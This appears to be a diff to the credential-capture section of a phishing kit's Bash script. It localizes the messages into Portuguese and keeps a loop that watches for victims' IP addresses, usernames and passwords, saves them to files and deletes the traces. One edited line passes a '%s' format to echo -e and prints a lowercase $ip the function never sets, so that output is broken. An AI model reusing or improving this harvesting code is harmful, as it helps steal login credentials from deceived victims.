@@ -282,7 +282,7 @@ capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${CYAN}${ICON_INFO}${RESET} ${GRAY}Novo acesso registrado${RESET}\n"
-	printf "${CYAN}${ICON_NET}${RESET} ${GRAY}IP:${RESET} ${WHITE}%s${RESET}\n" "$ip"
+	echo -e "${CYAN}${ICON_NET}${RESET} ${GRAY}IP:${RESET} ${WHITE}%s${RESET}\n" "$ip"
 	echo -ne "${GREEN}${ICON_OK}${RESET} ${GRAY}Salvo em:${RESET} ${WHITE}auth/ip.tx${RESET}\n"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
@@ -292,25 +292,25 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "${CYAN}${ICON_INFO}${RESET} ${GRAY}Usuário : ${RESET} ${WHITE}$ACCOUNT"
+	echo -e "${CYAN}${ICON_INFO}${RESET} ${GRAY}Senha : ${RESET} ${WHITE}$PASSWORD"
+	echo -e "\n${GREEN}${ICON_OK}${RESET} ${GRAY}Salvo em : ${RESET} ${CYAN}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${PURPLE}${ICON_WAIT}${RESET} ${GRAY}Aguardando novos eventos... ${CYAN}(Ctrl + C para sair)${RESET}"
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${PURPLE}${ICON_WAIT}${RESET} ${GRAY}Aguardando novas conexões... ${CYAN}(Ctrl + C para sair)${RESET}"
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${GREEN}${ICON_OK}${RESET} ${GREEN}Nova conexão detectada!${RESET}\n"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${CYAN}${ICON_INFO}${RESET} ${GREEN}Novos dados recebidos!${RESET}\n"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
